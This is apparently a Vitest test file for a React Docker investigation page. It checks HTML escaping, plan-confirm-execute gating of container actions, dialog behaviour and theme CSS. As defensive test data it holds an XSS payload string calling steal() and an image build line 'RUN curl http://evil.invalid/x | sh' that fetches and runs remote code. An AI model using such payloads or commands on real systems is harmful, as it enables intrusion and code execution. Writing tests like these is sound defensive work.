import { readFileSync } from "node:fs";

import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";

import type {
  DockerImageInspection,
  DockerLogs,
  DockerReadApi,
  DockerSecurityAudit,
} from "../shared/docker-read-contract";
import type { DockerWriteApi } from "../shared/docker-write-contract";
import type { ContainerFilesApi } from "../shared/exec-files-contract";
import type { DockerForensicsApi } from "../shared/docker-forensics-contract";
import {
  dockerCollectionForTab,
  dockerReadScope,
  containerRuntimeMessage,
  containerRuntimeNextStep,
  filterDockerContainers,
} from "./docker-read-helpers";
import {
  DockerLogsText,
  DockerPage,
  DockerSecurityView,
  InspectionDialog,
  imageDisplayName,
  withImageBreaks,
} from "./DockerPage";

const api: DockerReadApi & DockerWriteApi & ContainerFilesApi & DockerForensicsApi = {
  getDockerContainerChanges: vi.fn(async () => ({})),
  getDockerContainerProcesses: vi.fn(async () => ({})),
  listDockerContainerDirectory: vi.fn(async () => ({})),
  refreshDockerContainers: vi.fn(async () => ({})),
  getDockerCollection: vi.fn(async () => ({})),
  inspectDockerResource: vi.fn(async () => ({})),
  getDockerSecurityAudit: vi.fn(async () => ({})),
  getDockerLogs: vi.fn(async () => ({})),
  planDockerContainerAction: vi.fn(async () => ({})),
  confirmDockerContainerAction: vi.fn(async () => ({})),
  executeDockerContainerAction: vi.fn(async () => ({})),
  cancelDockerContainerAction: vi.fn(async () => ({})),
  readDockerContainerFile: vi.fn(async () => ({})),
  planDockerFileWrite: vi.fn(async () => ({})),
  planDockerFileCopy: vi.fn(async () => ({})),
  openDockerContainerTerminal: vi.fn(async () => ({ opened: true, reused: false })),
};
const hostile = "</pre><script>steal()</script><img src=x onerror=steal()>";

// A narrow image column broke "alpine:3.20" after "alpine:3."; it may now
// break only after a separator, and the text itself is unchanged.
describe("image references in the container table", () => {
  it("allow a line break only after : / and @, as plain text", () => {
    const html = renderToStaticMarkup(<>{withImageBreaks("registry.example/team/app@sha256:abc")}</>);
    expect(html).toBe("<span>registry.example/<wbr/></span><span>team/<wbr/></span><span>app@<wbr/></span><span>sha256:<wbr/></span><span>abc</span>");
    expect(renderToStaticMarkup(<>{withImageBreaks("alpine")}</>)).toBe("<span>alpine</span>");
    expect(renderToStaticMarkup(<>{withImageBreaks(hostile)}</>)).not.toContain("<script>");
  });
});

describe("standalone Docker read page", () => {
  it("renders a disconnected read boundary without internal capabilities", () => {
    const markup = renderToStaticMarkup(<DockerPage bindingHandle={null} api={api} />);
    expect(markup).toContain("连接目标后调查 Docker");
    expect(markup).toContain("启停容器这类操作要先确认再执行");
    expect(markup).not.toContain("sessionId");
    expect(markup).not.toContain("TargetGuard");
    expect(markup).not.toContain("bindingHandle");
  });

  it("renders hostile findings and logs only as escaped plain text", () => {
    const audit: DockerSecurityAudit = {
      snapshotHandle: "snapshot-1",
      containersScanned: 1,
      findings: [{
        severity: "critical",
        severityLabel: "严重",
        category: "privileged",
        categoryLabel: hostile,
        containerName: hostile,
        description: hostile,
        recommendation: hostile,
        textTruncated: false,
      }],
      summary: { critical: 1, high: 0, medium: 0, low: 0, info: 0, total: 1, score: 10 },
      truncated: false,
    };
    const logs: DockerLogs = {
      snapshotHandle: "snapshot-1",
      containerHandle: "container-1",
      tail: 200,
      text: hostile,
      truncated: false,
    };
    const markup = renderToStaticMarkup(
      <><DockerSecurityView status="ready" audit={audit} onRefresh={() => undefined} /><DockerLogsText logs={logs} /></>,
    );
    expect(markup).toContain("&lt;/pre&gt;&lt;script&gt;steal()&lt;/script&gt;");
    expect(markup).not.toContain("<script>steal()</script>");
    expect(markup).not.toContain("执行修复");
    expect(markup).not.toContain("删除容器");
    expect(markup).not.toContain("打开终端");
  });

  it("renders explicit loading, empty and truncated evidence states", () => {
    const loading = renderToStaticMarkup(
      <DockerSecurityView status="loading" audit={null} onRefresh={() => undefined} />,
    );
    const empty = renderToStaticMarkup(
      <DockerSecurityView status="ready" audit={null} onRefresh={() => undefined} />,
    );
    const truncated = renderToStaticMarkup(<DockerLogsText logs={{
      snapshotHandle: "snapshot-1",
      containerHandle: "container-1",
      tail: 200,
      text: "bounded",
      truncated: true,
    }} />);
    expect(loading).toContain("正在运行 Docker 安全调查");
    expect(empty).toContain("安全审计尚不可用");
    expect(truncated).toContain("结果中有内容过长，已截短显示。");
    // Nothing is hidden for looking like a secret any more; the notice must not claim it.
    expect(truncated).not.toContain("口令");
  });

  it("filters container display data and maps tabs only to closed collection kinds", () => {
    const containers = [{
      containerHandle: "container-1", shortId: "aaaaaaaaaaaa",
      name: hostile,
      image: "app:1",
      state: "running",
      status: "Up",
      ports: "8080/tcp",
      createdAt: "now",
    }];
    expect(filterDockerContainers(containers, "onerror")).toHaveLength(1);
    expect(filterDockerContainers(containers, "missing")).toHaveLength(0);
    expect(dockerCollectionForTab("containers")).toBe("stats");
    expect(dockerCollectionForTab("security")).toBeNull();
  });

  it("scopes renderer state only by the current 请先建立 SSH 连接 handle", () => {
    expect(dockerReadScope("binding-1")).toBe("binding-1");
    expect(dockerReadScope("binding-1")).not.toBe(dockerReadScope("binding-2"));
    const markup = renderToStaticMarkup(<DockerPage bindingHandle="binding-secret" api={api} />);
    // The header now names the runtime rather than repeating "当前目标"; with no
    // snapshot it says the neutral word.
    expect(markup).toContain("容器");
    expect(markup).not.toContain("binding-secret");
  });

  it("acts on containers only through plan, confirm and execute", () => {
    const source = readFileSync(new URL("./DockerPage.tsx", import.meta.url), "utf8");
    // The page can change a container now, and open a shell in one. What it
    // must never gain is a way to change one without a plan the operator saw
    // and approved, or a way to run a command of its own choosing — the shell
    // it opens is a window the operator types into, not a command it sends.
    for (const required of [
      "planDockerContainerAction(",
      "confirmDockerContainerAction(",
      "executeDockerContainerAction(",
      "cancelDockerContainerAction(",
      "openDockerContainerTerminal(",
    ]) expect(source).toContain(required);
    for (const forbidden of [
      ["mutate", "Docker"].join(""),
      ["readDocker", "File"].join(""),
      ["writeDocker", "File"].join(""),
      ["copyDocker", "File"].join(""),
      ["launchDocker", "Terminal"].join(""),
      ["executeDocker", "Command"].join(""),
      "dangerouslySetInnerHTML",
    ]) expect(source).not.toContain(forbidden);
    for (const forbidden of [
      "SshTargetSummary", "DockerConnection", "connectionId", "sessionId", "targetGuard",
      "generation", "username", "timestamp",
    ]) expect(source).not.toContain(forbidden);
    expect(source).toContain("bindingHandle: string | null");
    expect(source).toContain("dockerReadScope(bindingHandle)");
  });

  it("guards a destructive action against a second click landing before state moves", () => {
    const source = readFileSync(new URL("./DockerPage.tsx", import.meta.url), "utf8");
    // A `busy` flag in reducer state is set one render too late to stop the
    // second click, and the second click here would be a second container
    // stopped.
    expect(source).toContain("const actionRef = useRef<DockerActionOperation | null>(null)");
    expect(source).toContain("if (!isCurrentAction(operation) || operation.busy || plan === null || operation.plan !== plan) return;");
    expect(source).toContain("confirmed.planHandle !== plan.planHandle");
    expect(source).toContain("receipt.planHandle !== plan.planHandle");
  });

  /**
   * The details used to be a column docked beside the table, which is a thing
   * you can leave open and ignore. A dialog is not: it covers the page, so it
   * owes the operator every way out that a dialog is expected to have.
   */
  it("gives the details dialog the ways out a docked rail never needed", () => {
    const source = readFileSync(new URL("./DockerPage.tsx", import.meta.url), "utf8");
    expect(source).toContain('role="dialog"');
    expect(source).toContain('aria-modal="true"');
    // Dims what is behind it, like every other modal on this page.
    expect(source).toContain("useModalScrim()");
    // Escape closes it.
    expect(source).toMatch(/if \(event\.key === "Escape"\) onClose\(\);/u);
    expect(source).toContain('window.addEventListener("keydown", dismissOnEscape, true)');
    expect(source).toContain('window.removeEventListener("keydown", dismissOnEscape, true)');
    // A click on the backdrop closes it, but only one that started there — a
    // drag that began on the text being read must not dismiss it.
    expect(source).toContain("if (event.target === event.currentTarget) onClose();");
    // Focus moves into the dialog rather than staying on the table behind it.
    expect(source).toContain("closeRef.current?.focus()");

    const css = readFileSync(new URL("./docker-page.css", import.meta.url), "utf8");
    // Only the fields scroll; the name and the close button stay put.
    expect(css).toMatch(/\.docker-detail-dialog\s*\{[^}]*overflow:\s*hidden/su);
    expect(css).toMatch(/\.docker-detail-body\s*\{[^}]*overflow:\s*auto/su);
    // Nothing left holding a column of the page open.
    expect(css).not.toContain(".docker-detail-rail");
    expect(css).not.toContain(".docker-page-body");
  });

  it("shows an image as what it runs, as whom, and how it was built", () => {
    const inspection: DockerImageInspection = {
      kind: "image",
      snapshotHandle: "snapshot-1",
      resourceHandle: "image-1",
      shortId: "abc123abc123",
      repository: "incident-tools",
      tag: "latest",
      digest: "<none>",
      size: "12MB",
      createdAt: "2026-04-16 23:53:26 UTC",
      architecture: "amd64",
      os: "linux",
      author: hostile,
      user: "root（镜像没有指定用户）",
      entrypoint: ["/bin/sh"],
      command: ["-c", "sleep infinity"],
      workingDir: "/srv",
      environment: [`API_TOKEN=${hostile}`],
      exposedPorts: ["8080/tcp"],
      declaredVolumes: ["/data"],
      labels: [{ key: "maintainer", value: "ops" }],
      layers: ["sha256:aa", "sha256:bb"],
      repoTags: ["incident-tools:latest"],
      repoDigests: [],
      history: [{
        createdAt: "then",
        createdBy: "RUN curl http://evil.invalid/x | sh",
        size: "4MB",
        comment: "",
      }],
      truncated: false,
    };
    const markup = renderToStaticMarkup(
      <InspectionDialog status="ready" inspection={inspection} onClose={() => {}} />,
    );
    // Named by its tag, not by「未命名」.
    expect(markup).toContain("incident-tools:latest");
    // An image that set no user runs as root, and the page says so rather
    // than showing an empty field.
    expect(markup).toContain("root（镜像没有指定用户）");
    // Entrypoint and command read as the one line that will run.
    expect(markup).toContain("/bin/sh -c sleep infinity");
    // The build instruction is the line someone is scanning for.
    expect(markup).toContain("RUN curl http://evil.invalid/x | sh");
    // A credential baked into an image is the finding, shown as written.
    expect(markup).toContain("API_TOKEN=");
    // Author and environment are image-author text, so they are escaped
    // rather than trusted.
    expect(markup).not.toContain("<script>steal()</script>");
    expect(markup).toContain("&lt;script&gt;steal()&lt;/script&gt;");
    // Layers are counted, not listed: two dozen digests push everything
    // worth reading off the screen.
    expect(markup).toContain("2 层");
  });

  it("names an untagged image by the short id the runtime prints", () => {
    expect(imageDisplayName("alpine", "3.20", "abc123abc123")).toBe("alpine:3.20");
    expect(imageDisplayName("alpine", "<none>", "abc123abc123")).toBe("alpine");
    expect(imageDisplayName("<none>", "<none>", "abc123abc123"))
      .toBe("未命名镜像 abc123abc123");
  });

  it("uses global theme tokens with no color literals", () => {
    const css = readFileSync(new URL("./docker-page.css", import.meta.url), "utf8");
    expect((css.match(/var\(--[a-z0-9-]+\)/gu) ?? []).length).toBeGreaterThan(10);
    expect(css).not.toMatch(/#[0-9a-f]{3,8}\b|rgba?\(|hsla?\(/iu);
    expect(css).toMatch(/\.docker-log-text\s*\{[^}]*color:\s*var\(--console-text\)[^}]*background:\s*var\(--console-bg\)/su);
  });
});

describe("a host where no container could be listed", () => {
  it("names why in one panel, says what it does not mean, and what to do next", () => {
    const absent = containerRuntimeMessage(new Error("docker-runtime-absent"));
    expect(containerRuntimeNextStep(absent)).toContain("这不代表主机上一定没有容器");
    const silent = containerRuntimeMessage(new Error("docker-runtime-not-running"));
    expect(containerRuntimeNextStep(silent)).toContain("主机全景 › 系统服务");
    expect(containerRuntimeNextStep(null)).toContain("刷新");
    const source = readFileSync(new URL("./DockerPage.tsx", import.meta.url), "utf8");
    // The old second box spoke of "late results of an old target".
    expect(source).not.toContain("晚到结果");
    expect(source).toContain('data-testid="docker-unavailable"');
    expect(source).toContain('hidden={visibleState.snapshotStatus === "error" && visibleState.snapshot === null}');
  });
});
